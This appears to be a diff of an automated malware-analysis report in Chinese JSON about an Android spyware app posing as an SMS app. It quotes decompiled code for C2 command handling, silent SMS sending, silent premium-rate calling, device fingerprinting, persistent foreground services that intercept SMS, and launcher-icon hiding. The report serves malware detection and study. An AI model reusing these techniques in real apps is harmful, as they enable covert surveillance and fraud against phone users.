@@ -6,7 +6,7 @@
     "应用名": "СМC - Сообщениe",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 235.8
+    "分析耗时(秒)": 287.3
   },
   "行为列表": [
     {
@@ -23,14 +23,14 @@
       },
       "恶意代码": [
         {
-          "class_path": "Lcom\\compromise\\speech\\Diagram;",
-          "method_signature": "a(Context context, String str, String str2, String str3, int i)",
+          "class_path": "Lcom\\compromise\\speech\\DependenceBird;",
+          "method_signature": "onStartCommand(Intent intent, int i, int i2)",
           "malicious_behavior": "c2_communication",
           "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "Intent intent = new Intent(context, (Class<?>) LiverStop.class);\nintent.setAction(\"status\");\nintent.putExtra(\"id\", str3);\nintent.putExtra(\"command\", i);\nd.a(str, str2, PendingIntent.getBroadcast(context, 0, intent, 134217728));\n\nString stringExtra = intent.getStringExtra(\"body\");\nint intExtra = intent.getIntExtra(\"type\", 0);\nint intExtra2 = intent.getIntExtra(\"waitrun\", 0);",
-          "malicious_code_snippet_context": "      }\n  \n      private static void a(Context context, String str, String str2, String str3, int i) {\n>>>         Intent intent = new Intent(context, (Class<?>) LiverStop.class);\n>>>         intent.setAction(\"status\");\n>>>         intent.putExtra(\"id\", str3);\n>>>         intent.putExtra(\"command\", i);\n>>>         d.a(str, str2, PendingIntent.getBroadcast(context, 0, intent, 134217728));\n>>>     }\n>>> \n>>>     private void a(Intent intent) {\n>>>         int i;\n          boolean z = false;\n          String stringExtra = intent.getStringExtra(\"body\");\n          int intExtra = intent.getIntExtra(\"type\", 0);",
-          "behavior_description": "该代码构建了一个指向 LiverStop 类的 Intent，携带 \"id\" 和 \"command\" 参数，并通过 PendingIntent.getBroadcast() 创建广播 PendingIntent，再传入 d.a() 方法进行定时调度执行。另一个方法 a(Intent) 从 Intent 中提取 \"body\"、\"type\"、\"waitrun\" 等字段，表明该组件接收并解析来自 C2 通道下发的指令体，根据 type 和 waitrun 字段决定指令执行方式和延迟执行策略，构成远程命令调度与执行的 C2 通信框架。数据来源为 Intent extras（body/type/waitrun，来自 C2 服务器下发），危险操作为通过 PendingIntent 调度执行远程命令。",
+          "risk_level": "中",
+          "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    a();\n    return 1;\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         a();\n>>>         return 1;\n>>>     }\n  }",
+          "behavior_description": "该代码位于混淆命名的恶意服务 com.compromise.speech.DependenceBird 中。服务被启动时（onStartCommand）立即调用核心方法 a()，该方法推测为建立与C2服务器的连接或启动远程控制主逻辑（结合厂商报告，该样本伪装成短信应用并通过隐蔽服务实施监控）。返回值 1 即 START_STICKY，使服务被系统杀死后自动重启，保证C2通信通道持续存活；onDestroy 中取消通知ID 309 并 stopSelf，配合样本的隐蔽运行策略。数据流向：服务启动触发（系统/开机广播/恶意组件调用 startService）→ onStartCommand 调用 a() 启动C2通信主逻辑 → START_STICKY 保活维持长期远程控制通道。",
           "glm_analyzed": true
         }
       ]
@@ -63,9 +63,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
-          "malicious_code_snippet_context": "      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n              Umbrella.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
-          "behavior_description": "代码通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码和短信内容均来自外部传入的参数 str 和 str2，可能导致用户在不知情的情况下发送扣费短信或进行短信欺诈。",
+          "malicious_code_snippet": "public static void a(String str, String str2, PendingIntent pendingIntent) {\n    try {\n        Umbrella.a(true);\n        SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n    } catch (Exception e) {\n    }\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static void a(String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             Umbrella.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n>>>     }\n  \n      public static boolean a(Context context) {\n          return Build.VERSION.SDK_INT < 19 || \"com.compromise.speech\".equals(Telephony.Sms.getDefaultSmsPackage(context));",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 在完全无用户交互的情况下静默发送短信。数据流向为：目标号码(str)和短信内容(str2)来自方法参数（通常由 C2 远程指令或恶意配置下发）→ 经 sendTextMessage() 静默发送到指定号码，并携带 PendingIntent 用于发送结果回调。结合厂商报告（该样本伪装成 Messages 应用、利用 AccessibilityService 隐蔽运行的间谍木马）以及同文件中检查自身是否为默认短信应用（Telephony.Sms.getDefaultSmsPackage）、AlarmManager 每 60 秒定时唤醒 PilotPortion 等行为，可判定这是短信欺诈模块，可向增值号码发送扣费短信或向受害者联系人传播恶意链接，直接造成用户经济损失。",
           "glm_analyzed": true
         }
       ]
@@ -91,9 +91,42 @@
           "malicious_behavior": "device_fingerprinting",
           "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "public static String e(Context context) { return Settings.Secure.getString(context.getContentResolver(), \"android_id\"); }",
-          "malicious_code_snippet_context": "public static String e(Context context) { return Settings.Secure.getString(context.getContentResolver(), \"android_id\"); }",
-          "behavior_description": "该方法通过 Settings.Secure.getString() 读取设备的 android_id，属于设备指纹采集行为。android_id 是持久性设备标识符，可用于唯一追踪用户设备。在已确认的恶意样本中，此标识符通常会被收集并上报至C2服务器，用于设备指纹构建和用户追踪。",
+          "malicious_code_snippet": "public static String e(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String e(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  }",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统 Settings.Secure 内容提供程序中读取 ANDROID_ID（设备在恢复出厂设置前保持不变的64位唯一标识符），用于构建设备指纹。数据流向：系统设置数据库 Settings.Secure（source）→ 将设备唯一标识符返回给恶意程序调用方（sink）。结合该样本已被厂商确认为伪装成'短信'应用、滥用 AccessibilityService 的间谍恶意软件，此标识符采集行为用于唯一标识和追踪受害者设备，通常作为设备指纹信息随其他窃取数据上报至C2服务器。片段中其余代码（定时启动 BrokenLead Activity）与本指纹采集行为无直接关联。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\compromise\\speech\\Definition;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(getApplicationContext(), DependenceBird.class);\nif (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(intent);\n} else {\n    startService(intent);\n}\nIntentFilter intentFilter = new IntentFilter();\nintentFilter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\nintentFilter.addAction(\"status\");\nintentFilter.addAction(\"android.intent.action.PHONE_STATE\");",
+          "malicious_code_snippet_context": "                  System.exit(1);\n              }\n          });\n>>>         Intent intent = new Intent(getApplicationContext(), (Class<?>) DependenceBird.class);\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(intent);\n>>>         } else {\n>>>             startService(intent);\n>>>         }\n>>>         HandlerThread handlerThread = new HandlerThread(\"Smart\");\n>>>         handlerThread.start();\n>>>         a = new Handler(handlerThread.getLooper());\n>>>         IntentFilter intentFilter = new IntentFilter();\n          intentFilter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\n          intentFilter.addAction(\"status\");\n          intentFilter.addAction(\"android.intent.action.PHONE_STATE\");",
+          "behavior_description": "该代码位于恶意样本（伪装成短信应用的间谍木马）的服务 onCreate 中，通过 startForegroundService()/startService() 启动 DependenceBird 前台服务实现进程保活，使恶意服务持续驻留后台；同时注册 SMS_RECEIVED、PHONE_STATE 等广播监听，持续拦截 incoming 短信和电话状态（典型短信窃取/OTP 验证码拦截行为）；并通过设置 UncaughtExceptionHandler 调用 System.exit(1) 隐藏崩溃痕迹。数据流向：系统短信广播与电话状态广播→ 前台保活服务持续接收并拦截处理，为窃取短信内容和监控受害者提供持久化支撑。",
           "glm_analyzed": true
         }
       ]
@@ -128,7 +161,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
           "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              Umbrella.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
-          "behavior_description": "代码使用 ACTION_CALL Intent 直接拨打电话，无需用户在拨号界面确认。参数 str 作为电话号码传入，来源可能为远程配置或C2指令，通过 startActivity 静默发起呼叫，可能导致用户拨打高额收费号码造成经济损失。",
+          "behavior_description": "该代码位于混淆类 com.compromise.speech.Diagram 的 IntentService 命令处理流程中（由 onHandleIntent 触发）。方法将外部传入的电话号码字符串 str 拼接为 \"tel:\" URI，构造 ACTION_CALL Intent 并添加 FLAG_ACTIVITY_NEW_TASK（268435456）标志后调用 startActivity() 直接发起通话。注意此处使用的是 ACTION_CALL 而非 ACTION_DIAL：ACTION_DIAL 仅调起拨号界面等待用户确认，而 ACTION_CALL 会在无用户交互的情况下静默拨打电话（需 CALL_PHONE 权限）。数据流向为：远程指令/服务端下发的电话号码（经 IntentService 的 Intent 参数传入）→ 拼接 tel: URI → ACTION_CALL + startActivity() 静默拨号。结合该样本已被厂商确认为利用 AccessibilityService 的恶意软件（伪装成短信应用、隐藏自身进行监控），此静默拨号行为典型用于拨打攻击者控制的高费率/增值服务号码，实施资费消耗欺诈，直接造成用户经济损失。",
           "glm_analyzed": true
         }
       ]
@@ -151,10 +184,10 @@
           "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Belief.class), 2, 1);",
           "malicious_code_snippet_context": "          this.b.acquire();\n          d.b(getApplicationContext());\n          a.post(this.c);\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Belief.class), 2, 1);\n      }\n  }",
-          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将组件 Belief.class（通常为主 Activity，即应用图标入口）的启用状态设置为 2（COMPONENT_ENABLED_STATE_DISABLED），从而禁用该组件，使应用图标从启动器中隐藏。同时代码还注册了 SMS_RECEIVED 和 PHONE_STATE 广播监听并获取 WakeLock 保活，表明这是一个恶意样本在完成初始安装展示后隐藏自身图标，以便在后台持续运行进行短信拦截和电话状态监控而不被用户发现和卸载。",
+          "behavior_description": "该代码通过 PackageManager.setComponentEnabledSetting() 将应用自身的 Belief 组件（即带 LAUNCHER intent-filter 的主入口 Activity）设置为禁用状态（参数 2 = COMPONENT_ENABLED_STATE_DISABLED），并以 DONT_KILL_APP（参数 1）保持当前进程不被杀死，从而使应用图标从桌面启动器中消失，实现恶意应用的自我隐藏。数据流向：应用自身组件信息（getApplicationContext() + Belief.class 构造 ComponentName）→ setComponentEnabledSetting() 禁用启动器组件。结合同段代码中注册的 SMS_RECEIVED / PHONE_STATE 广播接收器、WakeLock 保活及 Handler 后台任务，该样本在隐藏图标后仍持续驻留后台监听短信与电话状态，与 Zscaler 报告中'隐藏自身以监视受害者'的间谍行为完全吻合，属于典型的恶意图标隐藏/持久化隐蔽手段。",
           "glm_analyzed": true
         }
       ]
@@ -167,7 +200,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
